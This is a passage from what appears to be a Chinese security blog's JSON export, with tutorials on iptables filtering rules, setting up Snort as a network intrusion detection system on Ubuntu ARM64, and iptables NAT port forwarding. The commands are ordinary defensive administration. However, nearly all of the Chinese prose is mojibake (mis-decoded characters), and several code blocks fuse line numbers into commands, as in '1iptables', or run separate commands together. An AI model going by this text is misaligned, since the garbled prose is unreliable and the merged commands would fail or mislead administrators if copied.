192.168.1.20-192.168.1.99 -j DROP ![Screen Shot 2022-07-19 at 14.21.48](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2022-07-19 at 14.21.48.png) ç¦æ­¢è½¬å‘ä¸æ­£å¸¸TCPè¿æ¥æ— å…³çš„éâ€”synè¯·æ±‚æ•°æ®åŒ… 1iptables -A FORWARD -m state --state NEW -p tcp !--syn -j DROP è¿™é‡Œæ¶‰åŠäº†æ•°æ®åŒ…çš„è¿æ¥çŠ¶æ€ã€‚-m stateè¡¨ç¤ºæ•°æ®åŒ…çš„è¿æ¥çŠ¶æ€ï¼ŒNEWè¡¨ç¤ºæ¯æ¬¡æ–°çš„è¿æ¥å¼€å§‹æ—¶. çŠ¶æ€å‚æ•°è¦æ”¾åœ¨å‰é¢ã€‚åœ¨é€‰æ‹©åè®®çš„å‰é¢ã€‚ è¿æ¥çŠ¶æ€ç›¸å…³çš„æ‰©å±•åŒ¹é…æ–‡æ¡£ NEW means that the packet has or will start a new connection, or that it is associated with a connection that has not seen packets in both directions. æ–‡æ¡£ä¸­ï¼ŒæŸ¥æ‰¾å’Œsynç›¸å…³çš„æ‰©å±•åŒ¹é…å†…å®¹ æ‹’ç»è®¿é—®é˜²ç«å¢™çš„æ–°æ•°æ®åŒ…ï¼Œä½†å…è®¸å“åº”è¿æ¥æˆ–ä¸å·²æœ‰è¿æ¥ç›¸å…³çš„æ•°æ®åŒ… 1iptables -A INPUT -p tcp -m state --state NEW -j DROP 1iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT è¿™ä¸ªä¹Ÿæ˜¯å’Œè¿æ¥ç›¸å…³çš„ã€‚æ–°æ•°æ®åŒ…å°±æ˜¯NEWæ–°çš„è¿æ¥ã€‚è€Œå·²æœ‰è¿æ¥ç›¸å…³çš„æ•°æ®åŒ…ï¼ŒåŒ…æ‹¬å·²ç»å»ºç«‹è¿æ¥äº†ESTABLISHEDçš„å’Œæ–°æ—§è¿æ¥éƒ½æœ‰å…³ç³»çš„RELATEDã€‚ NEW means that the packet has or will start a new connection, or that it is associated with a connection that has not seen packets in both directions. ESTABLISHED means that the packet is part of an already established connection that has seen packets in both directions and is fully valid. RELATED means that the packet is starting a new connection and is associated with an already established connection. åªå¼€æ”¾æœ¬æœºçš„webæœåŠ¡ï¼ˆ80ï¼‰ã€FTP(20ã€21ã€20450-20480)ï¼Œæ”¾è¡Œå¤–éƒ¨ä¸»æœºå‘ä½æœåŠ¡å™¨å…¶å®ƒç«¯å£çš„åº”ç­”æ•°æ®åŒ…ï¼Œå°†å…¶ä»–å…¥ç«™æ•°æ®åŒ…å‡äºˆä»¥ä¸¢å¼ƒå¤„ç† 1iptables -I INPUT -p tcp -m multiport --dport 20,21,80 -j ACCEPT 1iptables -I INPUT -p tcp --dport 20450:20480 -j ACCEPT 1iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT 1iptables -P INPUT DROP FTPæ˜¯ä½¿ç”¨tcpæ¥ä¼ è¾“çš„ï¼Œæ‰€ä»¥-p çš„åè®®é€‰ç”¨æ˜¯tcp å‚è€ƒé“¾æ¥iptablesè§„åˆ™ iptableså®˜æ–¹æ–‡æ¡£è¯´æ˜ iptables(8) - Linux man page iptables-tutorial","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"iptables","slug":"å…¥ä¾µæ£€æµ‹/iptables","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/iptables/"}],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://gryffinbit.top/tags/iptables/"}],"author":"Gryffinbit"},{"title":"é…ç½®snortä»¥NIDSæ¨¡å¼è¿è¡Œã€ubuntu ARM64ç³»ç»Ÿã€‘","slug":"é…ç½®snortä»¥NIDSæ¨¡å¼è¿è¡Œubuntu-ARM64","date":"2022-07-19T17:40:18.000Z","updated":"2024-11-12T07:00:07.000Z","comments":true,"path":"2022/07/20/é…ç½®snortä»¥NIDSæ¨¡å¼è¿è¡Œubuntu-ARM64/","permalink":"https://gryffinbit.top/2022/07/20/%E9%85%8D%E7%BD%AEsnort%E4%BB%A5NIDS%E6%A8%A1%E5%BC%8F%E8%BF%90%E8%A1%8Cubuntu-ARM64/","excerpt":"","text":"snortå®‰è£…snortçš„å®‰è£…è·³è½¬Blogï¼š ubuntuã€ARMæ¶æ„ã€‘ä¸‹å®‰è£…snortã€è™šæ‹Ÿæœºç‰ˆã€‘ ubuntuã€x86æ¶æ„ã€‘ä¸‹æ­å»ºsnort3ã€äº‘æœåŠ¡å™¨ç‰ˆã€‘ ubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® ç¯å¢ƒé…ç½®Ubuntu: Ubuntu 20.04.2 ARM64 ã€parallelè™šæ‹Ÿæœºã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœºã€‘ ubuntuæ“ä½œç”¨æˆ·ï¼šåœ¨parallelsæ™®é€šç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² snortç‰ˆæœ¬ï¼šsnort-2.9.20 daq-2.0.7ç‰ˆæœ¬ï¼šdaq-2.0.7 è§„åˆ™é›†ç‰ˆæœ¬ï¼š 29200 Tips: æ³¨æ„ï¼è§„åˆ™é›†å’Œsnortç‰ˆæœ¬è¦å¯¹åº”ä¸Šï¼Œå› ä¸ºä¸åŒç‰ˆæœ¬çš„å¯èƒ½ä¼šæœ‰ä¸€äº›æ–°è§„åˆ™ä¸èƒ½åŒ¹é…ä¸Šï¼Œå°±ä¸èƒ½é¡ºåˆ©è¿è¡Œã€‚å‚è€ƒå®˜ç½‘ï¼Œæ¯ä¸ªæ–°ç‰ˆæœ¬çš„è¯´æ˜ï¼ŒåŒ…æ‹¬è§„åˆ™é›†çš„è¯´æ˜ï¼š è§„åˆ™é›† ç‰ˆæœ¬è¯´æ˜ ubuntuæºï¼šä¸­ç§‘å¤§armæº snortå·¥ä½œæ¨¡å¼ã€é…ç½®æ–‡ä»¶ä»‹ç»snortå·¥ä½œæ¨¡å¼ã€é…ç½®æ–‡ä»¶ Blogè·³è½¬é“¾æ¥ï¼š snortçš„å·¥ä½œæ¨¡å¼ snorté…ç½®æ–‡ä»¶ï¼ˆå®šä¹‰ã€ä½¿ç”¨å˜é‡ï¼‰ é…ç½®snortæ›´æ–°å…±äº«åº“ 1sudo ldconfig åˆ›å»ºç¬¦å·è¿æ¥ snortè¢«å®‰è£…åˆ° /usr/local/bin/snort åˆ›å»ºç¬¦å·é“¾æ¥åˆ° /usr/sbin/snort 1sudo ln -s /usr/local/bin/snort /usr/sbin/snort åˆ›å»ºsnortç”¨æˆ· 12sudo groupadd snortsudo useradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort å‚æ•°è¯´æ˜ï¼š -rï¼šåˆ›å»ºä¸€ä¸ªç³»ç»Ÿè´¦æˆ· -sï¼šç”¨æˆ·ç™»å½•åä½¿ç”¨çš„shellåç§°ï¼ˆé»˜è®¤å€¼ä¸å¡«å†™ï¼Œè¿™æ ·ç³»ç»Ÿä¼šæŒ‡å®šé¢„è®¾çš„ç™»å…¥shellï¼Œæ ¹æ®&#x2F;etc&#x2F;default&#x2F;useraddé¢„è®¾å€¼ï¼‰ã€sbin&#x2F;nologin ä»£è¡¨è¿™ä¸ªç”¨æˆ·æ— æ³•ä½¿ç”¨bashæˆ–å…¶ä»–shellæ¥ç™»é™†ç³»ç»Ÿï¼Œå³ä½¿ç»™äº†å¯†ç ä¹Ÿä¸è¡Œï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç³»ç»Ÿèµ„æºã€‚åªæ˜¯ä¸èƒ½ç™»é™†ä¸»æœºè€Œå·²ã€‚ã€‘ -gï¼šgroupåç§°ã€æ·»åŠ åˆ°snortç»„ä¸‹ã€‘ -cï¼šcommentï¼Œæ³¨é‡Šè¯´æ˜æ  åˆ›å»ºsnortæ–‡ä»¶å¤¹ åˆ›å»ºsnortæ–‡ä»¶å¤¹ç”¨ä»¥å­˜æ”¾snorté…ç½®æ–‡ä»¶ 123sudo mkdir -p /etc/snort/rulessudo mkdir /var/log/snortsudo mkdir /usr/local/lib/snort_dynamicrules ç»™æ–‡ä»¶å¤¹èµ‹äºˆæƒé™ 123456sudo chmod -R 5775 /etc/snortsudo chmod -R 5775 /var/log/snortsudo chmod -R 5775 /usr/local/lib/snort_dynamicrulessudo chown -R snort:snort /etc/snortsudo chown -R snort:snort /var/log/snortsudo chown -R snort:snort /usr/local/lib/snort_dynamicrules 775æƒé™ï¼š rootæœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ ç»„ç”¨æˆ·æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ å…¶ä»–ç”¨æˆ·æœ‰è¯»ã€æ‰§è¡Œæƒé™ è¯»å–æƒé™ r&#x3D;4ã€‚å†™å…¥æƒé™ w&#x3D;2ã€‚æ‰§è¡Œæƒé™ x&#x3D;1 ç¬¬ä¸€ä¸ªæ•°å­— ï¼šæ‹¥æœ‰è€…æƒé™ï¼ˆrootï¼Œæ–‡ä»¶æ‰€æœ‰è€…ï¼‰ ç¬¬äºŒä¸ªæ•°å­— ï¼šç»„ç”¨æˆ·æƒé™ï¼ˆä¸æ–‡ä»¶æ‰€æœ‰è€…å±äºåŒä¸€ä¸ªç”¨æˆ·ç»„ï¼‰ ç¬¬ä¸‰ä¸ªæ•°å­— ï¼šå…¶ä»–ç”¨æˆ·æƒé™ å°†è¿™äº›æ–‡ä»¶çš„æ‰€å±ä¿®æ”¹ä¸ºä¹‹å‰åˆ›å»ºçš„snortç»„é‡Œé¢çš„snortç”¨æˆ· æŸ¥çœ‹æ–‡ä»¶æ‰€å± ls -l &lt;file&gt; ç¬¬ä¸€åˆ—å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯å«ä¹‰ï¼š â€‹ ç¬¬ä¸€ä¸ªå­—æ¯dï¼šæ„å‘³ç€å†…å®¹æ˜¯ç›®å½•æˆ–æ–‡ä»¶ â€‹ å¦‚æœç¬¬ä¸€ä¸ªæ˜¯-ï¼šæ„å‘³ç€å®ƒçš„å†…å®¹æ˜¯æ–‡ä»¶ â€‹ ç¬¬ä¸€ä¸ªæ˜¯lï¼šæ„å‘³ç€å†…å®¹æ˜¯é“¾æ¥æ–‡ä»¶ â€‹ åé¢çš„å†…å®¹æ˜¯æ–‡ä»¶æ‰€å± â€‹ ï¼ˆå¯¹åº”ç€ä¸‰ä¸ªæ•°å­—æƒé™775ï¼‰ â€‹ å‰ä¸‰ä¸ªå­—æ¯æ˜¯æ–‡ä»¶æ‹¥æœ‰è€…æƒé™ â€‹ ä¸­é—´ä¸‰ä¸ªæ˜¯æ–‡ä»¶æ‰€æœ‰ç»„æƒé™ â€‹ åä¸‰ä¸ªæ˜¯å…¶ä»–äººè®¿é—®æ–‡ä»¶çš„æƒé™ ç¬¬äºŒåˆ—å«ä¹‰ï¼šå¤šå°‘é“¾æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ ç¬¬ä¸‰åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„æ‰€æœ‰è€… ç¬¬å››åˆ—å«ä¹‰ï¼šè°æ˜¯è¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹æ‰€æœ‰ç»„ ç¬¬äº”åˆ—å«ä¹‰ï¼šè¿™ä¸ªæ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹çš„ä»¥å­—èŠ‚ä¸ºå•ä½çš„å¤§å°ã€‚ç›®å½•çš„å¤§å°æ€»æ˜¯4096å­—èŠ‚ ç¬¬å…­åˆ—å«ä¹‰ï¼šæ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ ç¬¬ä¸ƒåˆ—å«ä¹‰ï¼šæ–‡ä»¶åæˆ–ç›®å½•å åˆ›å»ºé»‘ç™½åå•å’Œè§„åˆ™ 123sudo touch /etc/snort/rules/white_list.rulessudo touch /etc/snort/rules/black_list.rulessudo touch /etc/snort/rules/local.rules å¤åˆ¶é…ç½®æ–‡ä»¶ ä»ä¸‹è½½çš„snort-2.9.20æ–‡ä»¶å¤¹é‡Œå¤åˆ¶é…ç½®æ–‡ä»¶ snort-2.9.20 çš„è·¯å¾„/home/parallels/snortFile 12sudo cp ~/snortFile/snort-2.9.20/etc/*.conf* /etc/snortsudo cp ~/snortFile/snort-2.9.20/etc/*.map /etc/snort ä¸‹è½½snortè§„åˆ™é›†snortå®˜ç½‘æä¾›äº†ä¸‰ç§è§„åˆ™é›†ï¼š ç¤¾åŒºç‰ˆï¼šå…è´¹çš„ï¼Œä½†æ˜¯åªæ˜¯å¾ˆç®€å•çš„è§„åˆ™é™åˆ¶ æ³¨å†Œç‰ˆï¼šå…è´¹æ³¨å†Œåå¯ä»¥è·å¾—codeï¼Œç”¨codeå¯ä»¥ä¸‹è½½æ³¨å†Œç‰ˆè§„åˆ™ è®¢é˜…ç‰ˆï¼šéœ€è¦è®¢é˜…ï¼Œæ‰å¯ä»¥ä¸‹è½½è§„åˆ™ æˆ‘é€‰æ‹©äº†æ³¨å†Œç‰ˆï¼Œä»¥ä¸‹éƒ½ä»¥æ³¨å†Œç‰ˆè¿›è¡Œæ¼”ç¤ºã€‚ æ³¨å†Œé“¾æ¥ oinkcode æ³¨å†ŒæˆåŠŸåï¼Œä¼šç»™ä¸€ä¸ªoinkcodeï¼Œåœ¨ä¸ªäººä¿¡æ¯ä¸­å¯ä»¥æ‰¾åˆ° ç„¶åå°±å¯ä»¥ä¸‹è½½è§„åˆ™äº†ï¼Œå°†oinkcodeæ¢æˆè‡ªå·±çš„ 1wget https://www.snort.org/rules/snortrules-snapshot-29200.tar.gz?oinkcode=oinkcode -O ~/registered.tar.gz å¤åˆ¶è§„åˆ™ ä¸‹è½½å®Œæˆåï¼Œå°†è§„åˆ™è§£å‹åˆ°snorté…ç½®æ–‡ä»¶å¤¹ /etc/snort 1sudo tar -xvf ~/registered.tar.gz -C /etc/snort é…ç½®ç½‘ç»œå’Œè§„åˆ™å·²ç»æœ‰äº†é…ç½®ä»¥åŠè§„åˆ™æ–‡ä»¶ï¼Œéœ€è¦ä¿®æ”¹snort.confçš„å˜é‡ã€‚ 1sudo vim /etc/snort/snort.conf ä¿®æ”¹snort.confçš„å†…å®¹ è®¾ç½®éœ€è¦ä¿æŠ¤çš„ipåœ°å€ 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules åœ¨setp6é‡Œï¼Œè®¾ç½®è¾“å‡º 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæ‰¾åˆ°è§„åˆ™é›†åˆ—è¡¨ã€‚æ‰“å¼€local.rulesçš„æ³¨é‡Šï¼Œä»¥å…è®¸snortè£…è½½ä¸ªæ€§åŒ–è§„åˆ™é›†ã€‚ 1include $RULE_PATH/local.rules ä¿å­˜ç¼–è¾‘:wq æµ‹è¯•æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œ 1sudo snort -T -c /etc/snort/snort.conf è¿è¡ŒæˆåŠŸ é™„å½•ï¼šsnort æ–‡ä»¶éƒ¨ç½²è·¯å¾„snortå®‰è£…åŒ…æ‰€åœ¨è·¯å¾„ã€ç›¸å…³æ–‡æ¡£ 1/home/parallels/snortFile docï¼šsnortçš„ä¸€äº›è¯´æ˜æ–‡æ¡£æ‰€åœ¨æ–‡ä»¶å¤¹ snortè§„åˆ™æ–‡ä»¶ã€é…ç½®æ–‡ä»¶ 1cd /etc/snort snortæ—¥å¿—æ–‡ä»¶ 1cd /var/log/snort snortè¿è¡Œ 1/usr/local/bin/snort å‚è€ƒæ–‡ç« snortå®˜æ–¹é…ç½®","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"NIDS","slug":"NIDS","permalink":"https://gryffinbit.top/tags/NIDS/"}],"author":"Gryffinbit"},{"title":"ä½¿ç”¨iptablesé…ç½®NAT","slug":"ä½¿ç”¨iptablesé…ç½®NAT","date":"2022-07-19T12:52:50.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/19/ä½¿ç”¨iptablesé…ç½®NAT/","permalink":"https://gryffinbit.top/2022/07/19/%E4%BD%BF%E7%94%A8iptables%E9%85%8D%E7%BD%AENAT/","excerpt":"","text":"SNATã€DNATä»‹ç» é€šè¿‡SNATå’ŒDNATå¯ä»¥ä½¿å†…ç½‘å’Œå¤–ç½‘è¿›è¡Œç›¸äº’é€šè®¯ SNATï¼ˆæºåœ°å€è½¬æ¢ï¼‰ï¼šæŒ‡æ•°æ®åŒ…ä»ç½‘å¡å‘é€å‡ºå»çš„æ—¶å€™ï¼ŒæŠŠæ•°æ®åŒ…ä¸­çš„æºåœ°å€éƒ¨åˆ†æ›¿æ¢ä¸ºæŒ‡å®šçš„IPï¼Œè¿™æ ·æ¥æ”¶æ–¹å°±è®¤ä¸ºæ•°æ®åŒ…çš„æ¥æºæ˜¯è¢«æ›¿æ¢çš„é‚£ä¸ªIPçš„ä¸»æœºã€åœ¨postroutingé“¾ã€‘ã€æ”¹å†™æ•°æ®åŒ…æºåœ°å€ï¼Œç›®çš„åœ°å€ä¿æŒä¸å˜ã€‘ DNATï¼ˆç›®çš„åœ°å€è½¬åŒ–ï¼‰ï¼šæŒ‡æ•°æ®åŒ…ä»ç½‘å¡å‘é€å‡ºå»çš„æ—¶å€™ï¼Œä¿®æ”¹æ•°æ®åŒ…ä¸­çš„ç›®çš„IPï¼Œè¡¨ç°ä¸ºå¦‚æœæƒ³è®¿é—®Aï¼Œå¯æ˜¯å› ä¸ºç½‘å…³åšäº†DNATï¼ŒæŠŠæ‰€æœ‰è®¿é—®Açš„æ•°æ®åŒ…çš„ç›®çš„IPå…¨éƒ¨ä¿®æ”¹ä¸ºBï¼Œé‚£ä¹ˆå®é™…ä¸Šè®¿é—®çš„æ˜¯Bã€‚ã€åœ¨preroutingé“¾ã€‘ã€å¯¹æ•°æ®åŒ…çš„ç›®çš„åœ°å€ä¿®æ”¹ï¼Œæºåœ°å€ä¸å˜ã€‘ SNAT SNAT åº”ç”¨åœºæ™¯ï¼š å¤šå°å†…ç½‘æœºå™¨ä½¿ç”¨åŒä¸€ä¸ªå…¬ç½‘IPä¸Šç½‘ å°†æœåŠ¡å™¨çš„æºIPéšè—ï¼Œæ”¹æˆå…¬å¼€çš„IP 1iptables -t nat -A POSTROUTING -p tcp --dport 1233 -j SNAT --to 192.168.0.1 -t nat : é…ç½®çš„æ˜¯natè¡¨ï¼Œ-tæŒ‡å®šäº†natè¡¨-A POSTROUTINGï¼šAä»£è¡¨çš„æ˜¯appendï¼Œå¢åŠ ä¸€ä¸ªPOSTROUTINGçš„chain-p tcp --dport 1233 ä»£è¡¨çš„æ˜¯åŒ¹é…åˆ°çš„æ•°æ®åŒ…çš„ç‰¹å¾ï¼Œä½¿ç”¨tcpåè®®ï¼Œç›®çš„ç«¯å£å·æ˜¯1233å·-j è¡¨ç¤ºçš„æ˜¯actionï¼Œè¯¥actionå°±æ˜¯è¿›è¡Œæºåœ°å€è½¬æ¢--to 192.168.0.1è½¬æ¢æˆ192.168.0.1çš„æºåœ°å€ï¼Œæºç«¯å£å·ä¸å˜ åœ°å€è½¬æ¢æ—¶æ•°æ®åŒ…çš„æƒ…å†µï¼š è‹¥åªå¼€å¯è·¯ç”±è½¬å‘ï¼Œæœªåšåœ°å€è½¬æ¢ï¼š ä»å±€åŸŸç½‘è®¿é—®å¤–ç½‘çš„æ•°æ®åŒ…ç»è¿‡ç½‘å…³è½¬å‘åå…¶æºIPåœ°å€ä¿æŒä¸å˜ã€‚å½“å¤–ç½‘ä¸­çš„ä¸»æœºæ”¶åˆ°è¿™æ ·çš„è¯·æ±‚æ•°æ®åŒ…åï¼Œå“åº”æ•°æ®åŒ…å°†æ— æ³•æ­£ç¡®è¿”å›ï¼Œä»è€Œå¯¼è‡´è®¿é—®å¤±è´¥ å¼€å¯è·¯ç”±è½¬å‘ï¼Œå¹¶è®¾ç½®SNATè½¬æ¢ï¼š å±€åŸŸç½‘è®¿é—®å¤–ç½‘çš„æ•°æ®åŒ…åˆ°è¾¾ç½‘å…³æœåŠ¡å™¨æ—¶ï¼Œä¼šå…ˆè¿›è¡Œè·¯ç”±é€‰æ‹©ã€‚å¦‚æœè¯¥æ•°æ®åŒ…éœ€è¦ä»å¤–ç½‘æ¥å£eth0 å‘å¤–è½¬å‘ï¼Œåˆ™å°†å…¶æºIPåœ°å€ä¿®æ”¹ä¸ºç½‘å…³çš„å¤–ç½‘æ¥å£åœ°å€ï¼Œç„¶åå‘é€ç»™ç›®æ ‡ä¸»æœº ä¼˜ç‚¹ï¼šå¤–ç½‘ä¸­çš„æœåŠ¡å™¨å¹¶ä¸çŸ¥é“å±€åŸŸç½‘PCæœºçš„å®é™…IPåœ°å€ï¼Œä¸­é—´çš„è½¬æ¢å®Œå…¨ç”±ç½‘å…³ä¸»æœºå®Œæˆï¼Œèµ·åˆ°äº†ä¿æŠ¤å†…éƒ¨ç½‘ç»œçš„ä½œç”¨ SNATç­–ç•¥çš„åº”ç”¨ï¼š å±€åŸŸç½‘å„ä¸»æœºæ­£ç¡®è®¾ç½®IPåœ°å€&#x2F;å­ç½‘æ©ç  å±€åŸŸç½‘å„ä¸»æœºæ­£ç¡®è®¾ç½®é»˜è®¤ç½‘å…³åœ°å€ Linuxç½‘å…³æ”¯æŒIPè·¯ç”±è½¬å‘ DNAT DNAT åº”ç”¨åœºæ™¯ï¼š ç«¯å£æ˜ å°„ï¼šå¯¹æ•°æ®åŒ…è¿›è¡Œè½¬å‘åˆ°æŒ‡å®šçš„åœ°å€ éšè—åç«¯æœåŠ¡çš„çœŸå®åœ°å€ï¼Œç”¨æˆ·è®¿é—®å…¬å¼€çš„åœ°å€ï¼Œç”±NATæœåŠ¡è¿›è¡Œè½¬å‘ 1iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 -t nat : é…ç½®çš„æ˜¯natè¡¨ï¼Œ-tæŒ‡å®šäº†natè¡¨ -A POSTROUTINGï¼šAä»£è¡¨çš„æ˜¯appendï¼Œå¢åŠ ä¸€ä¸ªPREROUTINGçš„chain -p tcp --dport 1233 ä»£è¡¨çš„æ˜¯åŒ¹é…åˆ°çš„æ•°æ®åŒ…çš„ç‰¹å¾ï¼Œä½¿ç”¨tcpåè®®ï¼Œç›®çš„ç«¯å£å·æ˜¯1233å· -j è¡¨ç¤ºçš„æ˜¯actionï¼Œè¯¥actionå°±æ˜¯è¿›è¡Œç›®æ ‡åœ°å€è½¬æ¢ --to-destination 127.0.0.1:6543ï¼š IPåœ°å€æ”¹æˆ127.0.0.1ï¼Œç«¯å£å·æ”¹æˆ6543 å®é™…åº”ç”¨åœºæ™¯ åœºæ™¯ï¼šServer A è¿è¡Œç€ä¸€ä¸ªæœåŠ¡s1ï¼Œåªå¼€æ”¾çš„æœ¬åœ°åœ°å€è¿æ¥ï¼Œå¼€æ”¾çš„ç«¯å£å·æ˜¯6543ã€‚å³Server Açš„æœåŠ¡s1ç›‘å¬çš„ç«¯å£æ˜¯127.0.0.1ï¼š6543ã€‚æœ¬åœ°å®¢æˆ·ç«¯Clientæƒ³è¿æ¥åˆ°æœåŠ¡s1å»ï¼Œè¿™æ—¶å¯ä»¥ä¿®æ”¹s1çš„é…ç½®æ–‡ä»¶ï¼Œè®©å…¶ç›‘å¬æ‰€æœ‰çš„åœ°å€ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨iptablesé…ç½®NATï¼Œä½¿å¾—å¯ä»¥è®¿é—®6543çš„ç«¯å£ã€‚ è§£å†³æ–¹æ¡ˆ1ï¼šåœ¨Server Aä¸­æ‰§è¡Œiptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543ï¼Œè®©è¿æ¥åˆ°Server Açš„1233çš„ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„6543ç«¯å£ä¸Šå»ï¼Œå®Œæˆäº†NATçš„æ˜ å°„ã€‚ æ¨¡æ‹Ÿï¼š step1ï¼š Server Aæ‰§è¡Œ nc -l -p 6543 ç›‘å¬æœ¬åœ°çš„6543ç«¯å£ step2ï¼š Server Aæ‰§è¡Œ iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 è¿›è¡Œåœ°å€æ˜ å°„ step3ï¼š åœ¨Clinet æ‰€åœ¨çš„æœºå™¨è®¿é—®Server Açš„1233ç«¯å£ï¼Œå‡è®¾Server Açš„å…¬ç½‘IPæ˜¯22.23.34.1ï¼Œnc 22.23.34.1 1233 step4: åœ¨Clientå»ºç«‹è¿æ¥åï¼Œè¾“å…¥å‡ ä¸ªå­—ç¬¦ï¼Œåœ¨Server Aç›‘å¬çš„6543ç«¯å£ä¸Šæœ‰æ˜¾ç¤ºå³å¯ã€‚ è§£å†³æ–¹æ¡ˆ2ï¼š iptables -t nat -A PREROUTING -p tcp --dport 5000 -j REDIRECT --to-ports 6543 ä½¿ç”¨REDIRECTçš„actionï¼Œç›´æ¥å°†Server Açš„5000ç«¯å£æ•°æ®è½¬å‘åˆ°æœ¬åœ°çš„6543ç«¯å£ä¸­å»ã€‚â€‹ ä¸Šè¿°æåˆ°çš„ä¸¤ä¸ªè§£å†³æ–¹æ¡ˆï¼Œåœ¨æœ¬åœ°éªŒè¯æ˜¯é€šè¿‡ä¸äº†çš„ã€‚å³Server Aå’ŒClient éƒ½æ˜¯åŒä¸€å°æœºå™¨ï¼Œå› ä¸ºä½¿ç”¨loç½‘å¡çš„æ—¶å€™ï¼Œæ˜¯æ²¡æœ‰PREROUTINGè¿™ä¸ªé˜¶æ®µçš„ï¼Œå¦‚æœä¸€å®šè¦åœ¨æœ¬åœ°è¿›è¡ŒNATçš„éªŒè¯ã€‚å¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤ï¼šiptables -t nat -I OUTPUT -p tcp -o lo --dport 1232 -j REDIRECT --to-ports 6543 ã€‚æ­¤å‘½ä»¤æ˜¯è®¾ç½®äº†ï¼Œloç½‘å¡çš„æ•°æ®åŒ…çš„ç›®çš„ç«¯å£æ˜¯1232çš„æ—¶å€™ï¼Œè½¬å‘åˆ°6543ç«¯å£å»ã€‚ä½¿ç”¨çš„æ˜¯OUTPUTï¼Œå› æ­¤ä»å¤–éƒ¨è®¿é—®Server Açš„1232ç«¯å£çš„è¯ï¼Œä¸ä¼šè½¬å‘çš„6543ç«¯å£å»ï¼Œä¸€å®šè¦æ˜¯æœ¬åœ°è®¿é—®æœ¬åœ°çš„æ—¶å€™æ‰è¡Œã€‚ ä½¿ç”¨ä¸Šè¿°çš„NATåŠŸèƒ½å‰ï¼Œä¸€å®šè¦å…ˆå¼€å¯linux natè½¬å‘çš„åŠŸèƒ½ï¼šecho 1 &gt; /proc/sys/net/ipv4/ip_forward ï¼Œé‡å¯åå¤±æ•ˆï¼Œå¦‚æœéœ€è¦é‡å¯åè¿˜å¼€å¯ï¼Œéœ€è¦å†™åˆ°&#x2F;etc&#x2F;rc.localä¸­å» ä¸Šè¿°æåˆ°çš„åœºæ™¯ï¼Œå¯æ‰©å±•ä¸ºServer Açš„1233ç«¯å£ï¼Œè½¬å‘åˆ°Server Bï¼ˆå‡è®¾åœ°å€æ˜¯8.8.8.8ï¼‰çš„6543ç«¯å£ä¸­å»ï¼ŒServer Açš„è§’è‰²æ˜¯ä¸€ä¸ªè·³æ¿ï¼Œåªè¦ä¿®æ”¹ä¸€ä¸‹å‘½ä»¤ï¼šæŠŠiptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 127.0.0.1:6543 æ”¹æˆ iptables -t nat -A PREROUTING -p tcp --dport 1233 -j DNAT --to-destination 8.8.8.8:6543 å‚è€ƒæ–‡ç« ä½¿ç”¨iptablesé…ç½®NAT 